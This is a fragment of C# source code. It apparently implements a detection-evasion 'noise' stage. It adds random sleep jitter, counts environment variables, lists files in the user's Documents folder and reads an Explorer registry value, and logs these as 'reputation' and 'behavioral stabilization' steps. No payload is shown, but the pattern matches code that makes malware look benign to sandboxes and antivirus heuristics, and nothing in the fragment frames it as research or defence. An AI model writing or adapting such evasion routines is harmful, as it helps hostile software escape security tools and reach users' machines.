                    System.Threading.Thread.Sleep(rnd.Next(200, 800));
                }

                // 2. Behavioral Noise (Environment variables)
                var env = Environment.GetEnvironmentVariables();
                Log($"Reputation: Scanned {env.Count} env vars.");

                // 3. Jitter
                System.Threading.Thread.Sleep(rnd.Next(1000, 3000));
            }
            catch { }
        }

        private static void DoBehavioralNoise()
        {
            try
            {
                Log("Performing behavioral stabilization (Noise phase)...");
                string myDocs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                if (Directory.Exists(myDocs))
                {
                    var files = Directory.EnumerateFiles(myDocs, "*.*", SearchOption.TopDirectoryOnly).Take(10).ToList();
                    Log($"Stabilization: Handled {files.Count} local artifacts.");
                }
                using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer");
                if (key != null) { key.GetValue("CleanShutdown"); }
                Thread.Sleep(2000);
            }
            catch { }
        }
    }
}
